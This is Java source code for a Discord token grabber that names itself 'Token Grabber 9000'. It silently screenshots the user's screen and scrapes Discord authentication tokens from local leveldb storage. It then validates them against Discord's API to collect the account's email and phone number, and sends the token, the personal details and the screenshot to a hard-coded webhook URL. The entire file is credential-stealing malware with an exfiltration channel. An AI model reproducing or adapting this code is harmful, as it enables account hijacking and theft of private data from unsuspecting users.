import okhttp3.*;
import org.json.JSONException;
import org.json.JSONObject;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.UUID;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
    public static String username;
    public static String token;
    public static String phone;
    public static String email;
    public static String discordUsername;
    public static String discriminator;
    public static String avatarURL;
    public static String webhookURL = https://discordapp.com/api/webhooks/713129765036621874/VV7w4bCdGau2h1XJwzYsQ1rfRjIEpP6JbTwIOAVN7zYKqXG-0mopQiV9_1HMhXETwDj6;
    public static String screenshotPath;
    public static void main(String[] args) throws IOException {
        username = System.getProperty("user.name");
        try {
            UUID uid = UUID.randomUUID();
            String fileName = uid.toString().split("-")[0];

            screenshotPath = "C:\\Users\\" + username + "\\AppData\\Local\\" + fileName + ".jpg";
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
            try {
                ImageIO.write(screenFullImage, "jpg", new File(screenshotPath));
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (AWTException e1) {
        }
        File f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb");
        List<String> list = new ArrayList<String>();
        int i = 0;
        while (i != Objects.requireNonNull(f.list()).length) {
            if (f.list()[i].contains("ldb")) {
                try {
                    BufferedReader reader = new BufferedReader(new FileReader("C:\\Users\\" + username + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\" + f.list()[i]));
                    String line = reader.readLine();
                    while (line != null) {
                        line = reader.readLine();
                        try {
                            Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                            Matcher matcher = pattern.matcher(line);
                            while (matcher.find()) {
                                //System.out.println("Found: " + matcher.group(0));
                                list.add(matcher.group(0));
                            }
                        } catch (Exception e) {

                        }
                    }
                } catch (IOException e) {
                }
            }
            if (f.list()[i].contains("log")) {
                try {
                    BufferedReader reader = new BufferedReader(new FileReader("C:\\Users\\" + username + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb\\" + f.list()[i]));
                    String line = reader.readLine();
                    while (line != null) {
                        line = reader.readLine();
                        try {
                            Pattern pattern = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                            Matcher matcher = pattern.matcher(line);
                            while (matcher.find()) {
                                //System.out.println("Found: " + matcher.group(0));
                                list.add(matcher.group(0));
                            }
                        } catch (Exception e) {

                        }
                    }
                } catch (IOException e) {
                }
            }
            i++;
        }

        for (String tok: list) {
            try {
                OkHttpClient client = new OkHttpClient().newBuilder()
                        .build();
                Request request = new Request.Builder()
                        .url("https://discordapp.com/api/v7/users/@me")
                        .method("GET", null)
                        .addHeader("authorization", tok)
                        .build();
                Response response = client.newCall(request).execute();
                String responseBody = response.body().string();
                if (responseBody.indexOf("id") != -1) {
                    token = tok;
                    try {
                        JSONObject obj = new JSONObject(responseBody);
                        phone = obj.getString("phone");
                        email = obj.getString("email");
                        discordUsername = obj.getString("username");
                        discriminator = obj.getString("discriminator");
                        String ID = obj.getString("id");
                        String avatarHash = obj.getString("avatar");
                        avatarURL = "https://cdn.discordapp.com/avatars/" + ID + "/" + avatarHash;


                        break;
                    } catch (JSONException e) {
                    }
                }
            } catch (IOException e) {
            }

        }
        if (email.equals("null")){
            email = "Email has not been connected";
        }
        if (phone.equals("null")){
            phone = "Phone has not been connected";
        }
        if (!discordUsername.equals("")){
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("text/plain");
            RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("file",screenshotPath,
                            RequestBody.create(MediaType.parse("application/octet-stream"),
                                    new File(screenshotPath)))
                    .addFormDataPart("payload_json", "{\"username\": \"Token Grabber 9000\",\"avatar_url\":\"https://media.tenor.com/images/cf0aa371a1600457ed444f29b134b498/tenor.gif\", \"embeds\": [{\"color\":3447003, \"fields\":[{\"name\":\"Token\",\"value\":\"" + token + "\"},{\"name\":\"Email\",\"value\":\"" + email + "\"},{\"name\":\"Phone Number\",\"value\":\"" + phone + "\"}],\"footer\":{\"text\":\"RustyBalboadev\",\"icon_url\":\"https://pbs.twimg.com/profile_images/1236555377405095936/eQMMQBsA_200x200.png\"},\"title\":\"Details on " + discordUsername + "#" + discriminator + "\",\"author\":{\"icon_url\":\"" + avatarURL + "\",\"name\": \"" + discordUsername + "\"}}]}")
                    .build();
            Request request = new Request.Builder()
                    .url(webhookURL)
                    .method("POST", body)
                    .addHeader("Cookie", "__cfduid=d8fbda1551a0cce6a5ac5a63b3e2f67651588731147; __cfruid=15d8adbab286cf4734fc3d2f4e0503e04ec394f7-1589372012")
                    .build();
            Response response = client.newCall(request).execute();
        }
    }
}
